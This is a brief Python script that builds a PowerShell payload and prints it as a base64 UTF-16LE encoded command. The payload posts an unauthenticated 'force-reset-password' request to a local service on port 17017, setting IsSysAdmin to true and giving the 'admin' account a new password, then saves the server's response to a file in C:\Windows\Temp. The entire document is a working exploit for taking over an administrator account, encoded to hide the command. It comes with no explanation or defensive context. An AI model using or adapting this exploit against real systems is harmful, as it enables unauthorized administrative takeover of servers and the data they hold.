import base64
ps = '''
$body = @{IsSysAdmin="true";OldPassword="whatever";Username="admin";NewPassword="P@ssw0rd123!@#";ConfirmPassword="P@ssw0rd123!@#"} | ConvertTo-Json
try {
  $r = Invoke-RestMethod -Uri "http://localhost:17017/api/v1/auth/force-reset-password" -Method Post -Body $body -ContentType "application/json"
  $r | ConvertTo-Json | Out-File -FilePath C:\Windows\Temp\smres.txt -Encoding ascii
} catch {
  $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
  $reader.ReadToEnd() | Out-File -FilePath C:\Windows\Temp\smres.txt -Encoding ascii
}
'''
print(base64.b64encode(ps.encode('utf-16-le')).decode())
